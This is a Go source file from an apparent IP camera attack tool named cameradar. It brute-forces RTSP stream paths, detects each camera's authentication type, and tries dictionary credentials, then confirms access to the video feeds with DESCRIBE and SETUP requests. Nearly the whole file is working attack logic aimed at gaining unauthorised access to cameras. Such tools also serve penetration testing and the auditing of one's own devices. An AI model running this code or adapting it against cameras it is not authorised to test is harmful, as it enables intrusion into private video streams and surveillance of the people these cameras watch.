package cameradar

import (
	"fmt"
	"time"

	curl "github.com/Ullaakut/go-curl"
)

// HTTP responses.
const (
	httpOK           = 200
	httpUnauthorized = 401
	httpForbidden    = 403
	httpNotFound     = 404
)

// CURL RTSP request types.
const (
	rtspDescribe = 2
	rtspSetup    = 4
)

// Attack attacks the given targets and returns the accessed devices.
func (s *Scanner) Attack(targets []Device) ([]Device, error) {
	if len(targets) == 0 {
		return nil, fmt.Errorf("unable to attack empty list of targets")
	}

	// Most cameras will be accessed successfully with these two attacks.
	s.term.StartStepf("Attacking streams of %d devices", len(targets))
	devices := s.AttackStream(targets)

	s.term.StartStepf("Attempting to detect authentication methods of %d devices", len(targets))
	devices = s.DetectAuthMethods(devices)

	s.term.StartStepf("Attacking credentials of %d devices", len(targets))
	devices = s.AttackCredentials(devices)

	s.term.StartStep("Validating that devices are accessible")
	devices = s.ValidateDevices(devices)

	// But some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
	// For these cameras, running another stream attack will solve the problem.
	for _, device := range devices {
		if len(device.RtspStreams) == 0 {
			s.term.StartStepf("Second round of attacks")
			devices = s.AttackStream(devices)

			s.term.StartStep("Validating that devices are accessible")
			devices = s.ValidateDevices(devices)

			break	
		}
	}
	s.term.EndStep()
	return devices, nil
}

// ValidateDevices tries to setup the device to validate whether or not it is available.
func (s *Scanner) ValidateDevices(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)

	for _, target := range targets {
		go s.validateDevice(target, resChan)
	}

	attackResults := []Device{}
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}
	targets = attackResults
	return targets
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackCredentials(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)

	for i := range targets {
		// TODO: Perf Improvement: Skip cameras with no auth type detected, and set their
		// CredentialsFound value to true.
		go s.attackCameraCredentials(targets[i], resChan)
	}

	attackResults := []Device{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}
	targets = attackResults
	return targets
}

// AttackStream attempts to guess the provided targets' deviceing streams using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackStream(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)

	for i := range targets {
		go s.attackCameraStream(targets[i], resChan)
	}

	attackResults := []Device{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}

//	for i := range attackResults {
//		if attackResults[i].StreamFound {
//			targets = replace(targets, attackResults[i])
//		}
//	}
	targets = attackResults
	return targets
}

// DetectAuthMethods attempts to guess the provided targets' authentication types, between
// digest, basic auth or none at all.
func (s *Scanner) DetectAuthMethods(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)
	for _, target := range targets {
		go s.detectAuthMethod(target, resChan)
		time.Sleep(s.attackInterval)
	}

	attackResults := []Device{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}
	targets = attackResults
	return targets
}

func (s *Scanner) detectAuthMethod (target Device, resChan chan<- Device) {
	for i := range target.RtspStreams{
		target.RtspStreams[i].AuthenticationType = s.AuthMethodAttack(target, i)
		var authMethod string
		switch target.RtspStreams[i].AuthenticationType {
		case 0:
			authMethod = "no"
		case 1:
			authMethod = "basic"
		case 2:
			authMethod = "digest"
		}
		s.term.Debugf("Device %s uses %s authentication method\n", GetCameraRTSPURL(target, i), authMethod)
		time.Sleep(s.attackInterval)
	}
	resChan <- target 
}


func (s *Scanner) attackCameraCredentials(target Device, resChan chan<- Device) {
	for i := range target.RtspStreams {
		ok := s.credAttack(target, i)

		if ok {
			target.RtspStreams[i].CredentialsFound = true
		} else {
			target.RtspStreams[i].CredentialsFound = false
		}
		time.Sleep(s.attackInterval)
	}
	resChan <- target
}

func (s *Scanner) attackCameraStream(target Device, resChan chan<- Device) {
	var r rtspStream

	for _, stream := range s.streams {
		ok := s.streamAttack(target, stream)
		if ok {
			r.Stream = stream
			r.CredentialsFound = false
			r.Available = false

			target.RtspStreams = append(target.RtspStreams, r)
		}
		time.Sleep(s.attackInterval)
	}
	target.Password = s.password
	target.Username = s.username
	
	resChan <- target
}

func (s *Scanner) AuthMethodAttack(device Device, i int) int {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%d/%s",
		device.Address,
		device.Port,
		device.RtspStreams[i].Stream,
	)

	s.setCurlOptions(c)

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.RtspStreams[i].AuthenticationType, err)
		return -1
	}

	authType, err := c.Getinfo(curl.INFO_HTTPAUTH_AVAIL)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return -1
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", authType)
	}

	return authType.(int)
}

func (s *Scanner) streamAttack(device Device, stream string) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		device.Username,
		device.Password,
		device.Address,
		device.Port,
		stream,
	)

	var aType int
	for _, s := range device.RtspStreams{
		if s.Stream == stream {
			aType = s.AuthenticationType
		}
	}
	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, aType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(device.Username, ":", device.Password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, aType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 401 or 403, it means that the credentials are wrong but the stream might be okay.
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK || rc == httpUnauthorized || rc == httpForbidden {
		return true
	}
	return false
}

func (s *Scanner) credAttack(device Device, i int) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		device.Username,
		device.Password,
		device.Address,
		device.Port,
		device.RtspStreams[i].Stream,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, device.RtspStreams[i].AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(device.Username, ":", device.Password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.RtspStreams[i].AuthenticationType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}

	// If it's a 404, it means that the stream is incorrect but the credentials might be okay.
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK || rc == httpNotFound {
		return true
	}
	return false
}


func (s *Scanner) validateDevice(device Device, resChan chan<- Device) {
	for i := range device.RtspStreams {
		ok := s.validateStream(device, i)
		if ok{
			device.RtspStreams[i].Available = true
		}
		time.Sleep(s.attackInterval)
	}

	resChan <- device 
}

func (s *Scanner) validateStream(device Device, i int) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		device.Username,
		device.Password,
		device.Address,
		device.Port,
		device.RtspStreams[i].Stream,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, device.RtspStreams[i].AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(device.Username, ":", device.Password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspSetup)

	_ = c.Setopt(curl.OPT_RTSP_TRANSPORT, "RTP/AVP;unicast;client_port=33332-33333")

	// Perform the request.
	err := c.Perform()
	if err != nil {

		fmt.Println("encoutnered an error in perform: " + err.Error())

		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.RtspStreams[i].AuthenticationType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("SETUP", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK {
		return true
	}
	return false
}

func (s *Scanner) setCurlOptions(c Curler) {
	// Do not write sdp in stdout
	_ = c.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
	// Do not use signals (would break multithreading).
	_ = c.Setopt(curl.OPT_NOSIGNAL, 1)
	// Do not send a body in the describe request.
	_ = c.Setopt(curl.OPT_NOBODY, 1)
	// Set custom timeout.
	_ = c.Setopt(curl.OPT_TIMEOUT_MS, int(s.timeout/time.Millisecond))
}

// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
func doNotWrite([]uint8, interface{}) bool {
	return true
}
